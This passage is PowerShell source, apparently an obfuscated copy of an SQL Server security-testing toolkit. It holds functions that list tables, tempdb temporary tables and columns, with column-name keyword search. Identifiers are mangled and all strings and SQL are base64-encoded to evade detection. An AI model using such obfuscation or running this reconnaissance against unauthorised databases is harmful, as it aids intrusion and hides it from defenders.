        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$TableName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\/=\_____/==\/\} = New-Object -TypeName System.Data.DataTable
        if($TableName)
        {
            ${_/=\__/\_/==\__/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABXAEgARQBSAEUAIAB0AC4AVABhAGIAbABlAE4AYQBtAGUAIABsAGkAawBlACAAJwAlACQAVABhAGIAbABlAE4AYQBtAGUAJQAnAA==')))
        }
        else
        {
            ${_/=\__/\_/==\__/=} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAdABhAGIAbABlAHMAIABmAHIAbwBtACAAZABhAHQAYQBiAGEAcwBlAHMAIABiAGUAbABvAHcAOgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQALgBUAEEAQgBMAEUAXwBDAEEAVABBAEwATwBHACAAQQBTACAAWwBEAGEAdABhAGIAYQBzAGUATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAuAFQAQQBCAEwARQBfAFMAQwBIAEUATQBBACAAQQBTACAAWwBTAGMAaABlAG0AYQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAgAEEAUwAgAFsAVABhAGIAbABlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAQQBTAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBOACAAKABTAEUATABFAEMAVAAgAEMAQQBTAEUAIABXAEgARQBOACAATABFAE4AKAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQApACAALQAgAEwARQBOACgAUgBFAFAATABBAEMARQAoAHQALgBUAEEAQgBMAEUAXwBOAEEATQBFACwAJwAjACcALAAnACcAKQApACAAPgAgADEAIABUAEgARQBOACAAMQAgAEUATABTAEUAIAAwACAARQBOAEQAKQAgAD0AIAAxACAAVABIAEUATgAgACcARwBsAG8AYgBhAGwAVABlAG0AcABUAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAgAEwASQBLAEUAIAAnACUAWwBfAF0AJQAnACAAQQBOAEQAIAAoAFMARQBMAEUAQwBUACAAQwBBAFMARQAgAFcASABFAE4AIABMAEUATgAoAHQALgBUAEEAQgBMAEUAXwBOAEEATQBFACkAIAAtACAATABFAE4AKABSAEUAUABMAEEAQwBFACgAdAAuAFQAQQBCAEwARQBfAE4AQQBNAEUALAAnACMAJwAsACcAJwApACkAIAA9ACAAMQAgAFQASABFAE4AIAAxACAARQBMAFMARQAgADAAIABFAE4ARAApACAAPQAgADEAIABUAEgARQBOACAAJwBMAG8AYwBhAGwAVABlAG0AcABUAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAgAE4ATwBUACAATABJAEsARQAgACcAJQBbAF8AXQAlACcAIABBAE4ARAAgACgAUwBFAEwARQBDAFQAIABDAEEAUwBFACAAVwBIAEUATgAgAEwARQBOACgAdAAuAFQAQQBCAEwARQBfAE4AQQBNAEUAKQAgAC0AIABMAEUATgAoAFIARQBQAEwAQQBDAEUAKAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAsACcAIwAnACwAJwAnACkAKQAgAD0AIAAxACAAVABIAEUATgAgADEAIABFAEwAUwBFACAAMAAgAEUATgBEACkAIAA9ACAAMQAgAFQASABFAE4AIAAnAFQAYQBiAGwAZQBWAGEAcgBpAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUAIAB0AC4AVABBAEIATABFAF8AVABZAFAARQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAAgAEEAUwAgAFQAYQBiAGwAZQBUAHkAcABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwAuAGkAcwBfAG0AcwBfAHMAaABpAHAAcABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAC4AaQBzAF8AcAB1AGIAbABpAHMAaABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAC4AaQBzAF8AcwBjAGgAZQBtAGEAXwBwAHUAYgBsAGkAcwBoAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBjAHIAZQBhAHQAZQBfAGQAYQB0AGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAC4AbQBvAGQAaQBmAHkAXwBkAGEAdABlACAAQQBTACAAbQBvAGQAaQBmAGkAZQBkAF8AZABhAHQAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9AF0ALgBbAEkATgBGAE8AUgBNAEEAVABJAE8ATgBfAFMAQwBIAEUATQBBAF0ALgBbAFQAQQBCAEwARQBTAF0AIAB0AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABKAE8ASQBOACAAcwB5AHMALgB0AGEAYgBsAGUAcwAgAHMAdAAgAE8ATgAgAHQALgBUAEEAQgBMAEUAXwBOAEEATQBFACAAPQAgAHMAdAAuAG4AYQBtAGUAIABBAE4ARAAgAHQALgBUAEEAQgBMAEUAXwBTAEMASABFAE0AQQAgAD0AIABPAEIASgBFAEMAVABfAFMAQwBIAEUATQBBAF8ATgBBAE0ARQAoAHMAdAAuAG8AYgBqAGUAYwB0AF8AaQBkACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEoATwBJAE4AIABzAHkAcwAuAG8AYgBqAGUAYwB0AHMAIABzACAATwBOACAAcwB0AC4AbwBiAGoAZQBjAHQAXwBpAGQAIAA9ACAAcwAuAG8AYgBqAGUAYwB0AF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAD0AXABfAF8ALwBcAF8ALwA9AD0AXABfAF8ALwA9AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8AUgBEAEUAUgAgAEIAWQAgAHQALgBUAEEAQgBMAEUAXwBDAEEAVABBAEwATwBHACwAIAB0AC4AVABBAEIATABFAF8AUwBDAEgARQBNAEEALAAgAHQALgBUAEEAQgBMAEUAXwBOAEEATQBFAA==')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${_/\/=\_____/==\/\} = ${_/\/=\_____/==\/\} + ${/=\_____/\/\/=\__}
        }
    }
    End
    {
        ${_/\/=\_____/==\/\}
    }
}
Function  Get-SQLTableTemp
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\/=\_____/==\/\} = New-Object -TypeName System.Data.DataTable
        if($TableName)
        {
            ${_/=\__/\_/==\__/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAB3AGgAZQByAGUAIAB0AGEAYgBsAGUAXwBuAGEAbQBlACAAbABpAGsAZQAgACcAJQAkAFQAYQBiAGwAZQBOAGEAbQBlACUAJwA=')))
        }
        else
        {
            ${_/=\__/\_/==\__/=} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAdABhAGIAbABlAHMAIABmAHIAbwBtACAAZABhAHQAYQBiAGEAcwBlAHMAIABiAGUAbABvAHcAOgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABTAEUAUgBWAEUAUgBQAFIATwBQAEUAUgBUAFkAKAAnAE0AYQBjAGgAaQBuAGUATgBhAG0AZQAnACkAIABhAHMAIABDAG8AbQBwAHUAdABlAHIAXwBOAGEAbQBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABAAFMARQBSAFYARQBSAE4AQQBNAEUAIABBAFMAIABJAG4AcwB0AGEAbgBjAGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnAHQAZQBtAHAAZABiACcAIABhAHMAIAAnAEQAYQB0AGEAYgBhAHMAZQBfAE4AYQBtAGUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAQwBIAEUATQBBAF8ATgBBAE0ARQAoAHQAMQAuAHMAYwBoAGUAbQBhAF8AaQBkACkAIABBAFMAIAAnAFMAYwBoAGUAbQBhAF8ATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAxAC4AbgBhAG0AZQAgAEEAUwAgACcAVABhAGIAbABlAF8ATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBBAFMARQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAAoAFMARQBMAEUAQwBUACAAQwBBAFMARQAgAFcASABFAE4AIABMAEUATgAoAHQAMQAuAG4AYQBtAGUAKQAgAC0AIABMAEUATgAoAFIARQBQAEwAQQBDAEUAKAB0ADEALgBuAGEAbQBlACwAJwAjACcALAAnACcAKQApACAAPgAgADEAIABUAEgARQBOACAAMQAgAEUATABTAEUAIAAwACAARQBOAEQAKQAgAD0AIAAxACAAVABIAEUATgAgACcARwBsAG8AYgBhAGwAVABlAG0AcABUAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAB0ADEALgBuAGEAbQBlACAATABJAEsARQAgACcAJQBbAF8AXQAlACcAIABBAE4ARAAgACgAUwBFAEwARQBDAFQAIABDAEEAUwBFACAAVwBIAEUATgAgAEwARQBOACgAdAAxAC4AbgBhAG0AZQApACAALQAgAEwARQBOACgAUgBFAFAATABBAEMARQAoAHQAMQAuAG4AYQBtAGUALAAnACMAJwAsACcAJwApACkAIAA9ACAAMQAgAFQASABFAE4AIAAxACAARQBMAFMARQAgADAAIABFAE4ARAApACAAPQAgADEAIABUAEgARQBOACAAJwBMAG8AYwBhAGwAVABlAG0AcABUAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAB0ADEALgBuAGEAbQBlACAATgBPAFQAIABMAEkASwBFACAAJwAlAFsAXwBdACUAJwAgAEEATgBEACAAKABTAEUATABFAEMAVAAgAEMAQQBTAEUAIABXAEgARQBOACAATABFAE4AKAB0ADEALgBuAGEAbQBlACkAIAAtACAATABFAE4AKABSAEUAUABMAEEAQwBFACgAdAAxAC4AbgBhAG0AZQAsACcAIwAnACwAJwAnACkAKQAgAD0AIAAxACAAVABIAEUATgAgADEAIABFAEwAUwBFACAAMAAgAEUATgBEACkAIAA9ACAAMQAgAFQASABFAE4AIAAnAFQAYQBiAGwAZQBWAGEAcgBpAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUAIABOAFUATABMAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATgBEACAAQQBTACAAVABhAGIAbABlAF8AVAB5AHAAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAMgAuAG4AYQBtAGUAIABBAFMAIAAnAEMAbwBsAHUAbQBuAF8ATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAzAC4AbgBhAG0AZQAgAEEAUwAgACcAQwBvAGwAdQBtAG4AXwBUAHkAcABlACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0ADEALgBpAHMAXwBtAHMAXwBzAGgAaQBwAHAAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAxAC4AaQBzAF8AcAB1AGIAbABpAHMAaABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0ADEALgBpAHMAXwBzAGMAaABlAG0AYQBfAHAAdQBiAGwAaQBzAGgAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAxAC4AYwByAGUAYQB0AGUAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAxAC4AbQBvAGQAaQBmAHkAXwBkAGEAdABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAWwB0AGUAbQBwAGQAYgBdAC4AWwBzAHkAcwBdAC4AWwBvAGIAagBlAGMAdABzAF0AIABBAFMAIAB0ADEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEoATwBJAE4AIABbAHQAZQBtAHAAZABiAF0ALgBbAHMAeQBzAF0ALgBbAGMAbwBsAHUAbQBuAHMAXQAgAEEAUwAgAHQAMgAgAE8ATgAgAHQAMQAuAE8AQgBKAEUAQwBUAF8ASQBEACAAPQAgAHQAMgAuAE8AQgBKAEUAQwBUAF8ASQBEAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABKAE8ASQBOACAAcwB5AHMALgB0AHkAcABlAHMAIABBAFMAIAB0ADMAIABPAE4AIAB0ADIALgBzAHkAcwB0AGUAbQBfAHQAeQBwAGUAXwBpAGQAIAA9ACAAdAAzAC4AcwB5AHMAdABlAG0AXwB0AHkAcABlAF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBSAEUAIAB0ADEALgBuAGEAbQBlACAATABJAEsARQAgACcAIwAlACcAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAA')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${_/\/=\_____/==\/\} = ${_/\/=\_____/==\/\} + ${/=\_____/\/\/=\__}        
    }
    End
    {
        ${_/\/=\_____/==\/\}
    }
}
Function  Get-SQLColumn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$TableName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by exact column name.')]
        [string]$ColumnName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Column name using wildcards in search.  Supports comma seperated list.')]
        [string]$ColumnNameSearch,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\/\_/\/=\/\____} = New-Object -TypeName System.Data.DataTable
        if($TableName)
        {
            ${_/=\/=\/=\/=\/=\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHQALgBUAEEAQgBMAEUAXwBOAEEATQBFACAAbABpAGsAZQAgACcAJQAkAFQAYQBiAGwAZQBOAGEAbQBlACUAJwA=')))
        }
        else
        {
            ${_/=\/=\/=\/=\/=\/} = ''
        }
        if($ColumnName)
        {
            ${/=\_/\_/\/\/\_/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGMALgBDAE8ATABVAE0ATgBfAE4AQQBNAEUAIABsAGkAawBlACAAJwAkAEMAbwBsAHUAbQBuAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${/=\_/\_/\/\/\_/\/} = ''
        }
        if($ColumnNameSearch)
        {
            ${_/\/=\_/==\____/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGMALgBDAE8ATABVAE0ATgBfAE4AQQBNAEUAIABsAGkAawBlACAAJwAlACQAQwBvAGwAdQBtAG4ATgBhAG0AZQBTAGUAYQByAGMAaAAlACcA')))
        }
        else
        {
            ${_/\/=\_/==\____/=} = ''
        }
        if($ColumnNameSearch)
        {
            $Keywords = $ColumnNameSearch.split(',')
            [int]${_/\_/\/\__/\____/} = $Keywords.Count
            while (${_/\_/\/\__/\____/} -gt 0)
            {
                ${_/\_/\/\__/\____/} = ${_/\_/\/\__/\____/} - 1
                $Keyword = $Keywords[${_/\_/\/\__/\____/}]
                if(${_/\_/\/\__/\____/} -eq ($Keywords.Count -1))
                {
                    ${_/\/=\_/==\____/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQAIABjAC4AQwBPAEwAVQBNAE4AXwBOAEEATQBFACAAbABpAGsAZQAgACcAJQAkAEsAZQB5AHcAbwByAGQAJQAnAA==')))
                }
                else
                {
                    ${_/\/=\_/==\____/=} = ${_/\/=\_/==\____/=} + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABvAHIAIABjAC4AQwBPAEwAVQBNAE4AXwBOAEEATQBFACAAbABpAGsAZQAgACcAJQAkAEsAZQB5AHcAbwByAGQAJQAnAA==')))
                }
            }
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQALgBUAEEAQgBMAEUAXwBDAEEAVABBAEwATwBHACAAQQBTACAAWwBEAGEAdABhAGIAYQBzAGUATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAuAFQAQQBCAEwARQBfAFMAQwBIAEUATQBBACAAQQBTACAAWwBTAGMAaABlAG0AYQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAgAGEAcwAgAFsAVABhAGIAbABlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAQQBTAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBOACAAKABTAEUATABFAEMAVAAgAEMAQQBTAEUAIABXAEgARQBOACAATABFAE4AKAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQApACAALQAgAEwARQBOACgAUgBFAFAATABBAEMARQAoAHQALgBUAEEAQgBMAEUAXwBOAEEATQBFACwAJwAjACcALAAnACcAKQApACAAPgAgADEAIABUAEgARQBOACAAMQAgAEUATABTAEUAIAAwACAARQBOAEQAKQAgAD0AIAAxACAAVABIAEUATgAgACcARwBsAG8AYgBhAGwAVABlAG0AcABUAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAgAEwASQBLAEUAIAAnACUAWwBfAF0AJQAnACAAQQBOAEQAIAAoAFMARQBMAEUAQwBUACAAQwBBAFMARQAgAFcASABFAE4AIABMAEUATgAoAHQALgBUAEEAQgBMAEUAXwBOAEEATQBFACkAIAAtACAATABFAE4AKABSAEUAUABMAEEAQwBFACgAdAAuAFQAQQBCAEwARQBfAE4AQQBNAEUALAAnACMAJwAsACcAJwApACkAIAA9ACAAMQAgAFQASABFAE4AIAAxACAARQBMAFMARQAgADAAIABFAE4ARAApACAAPQAgADEAIABUAEgARQBOACAAJwBMAG8AYwBhAGwAVABlAG0AcABUAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAgAE4ATwBUACAATABJAEsARQAgACcAJQBbAF8AXQAlACcAIABBAE4ARAAgACgAUwBFAEwARQBDAFQAIABDAEEAUwBFACAA